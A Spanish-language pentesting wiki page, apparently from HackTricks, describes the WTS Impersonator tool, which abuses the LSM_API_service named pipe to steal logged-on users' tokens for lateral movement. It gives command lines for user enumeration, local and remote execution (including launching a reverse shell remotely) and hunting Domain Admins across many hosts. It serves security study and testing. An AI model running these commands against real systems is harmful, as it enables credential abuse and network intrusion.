# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

La herramienta **WTS Impersonator** explota el Named pipe RPC **"\\pipe\LSM_API_service"** para enumerar de forma sigilosa los usuarios con sesión iniciada y secuestrar sus tokens, evitando las técnicas tradicionales de Token Impersonation. Este enfoque facilita los movimientos laterales dentro de las redes. La innovación detrás de esta técnica se atribuye a **Omri Baso, cuyo trabajo está disponible en [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.<sup>[[1]](#references)</sup>

### Funcionalidad principal

La herramienta funciona mediante una secuencia de llamadas a la API:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Módulos principales y uso

- **Enumeración de usuarios**: Es posible enumerar usuarios locales y remotos con la herramienta mediante comandos para cada escenario:

- Localmente:
```bash
.\WTSImpersonator.exe -m enum
```
- Remotamente, especificando una dirección IP o un nombre de host:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Ejecución de comandos**: Los módulos `exec` y `exec-remote` requieren un contexto de **Service** para funcionar. La ejecución local solo necesita el ejecutable WTSImpersonator y un comando:

- Ejemplo de ejecución de comandos local:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Se puede usar PsExec64.exe para obtener un contexto de Service:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Ejecución remota de comandos**: Consiste en crear e instalar un Service remotamente, de forma similar a PsExec.exe, lo que permite ejecutar comandos con los permisos adecuados.

- Ejemplo de ejecución remota:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Módulo User Hunting**: Se dirige a usuarios específicos en varias máquinas y ejecuta código con sus credenciales. Esto resulta especialmente útil para dirigirse a Domain Admins con derechos de administrador local en varios sistemas.
- Ejemplo de uso:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## Referencias

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
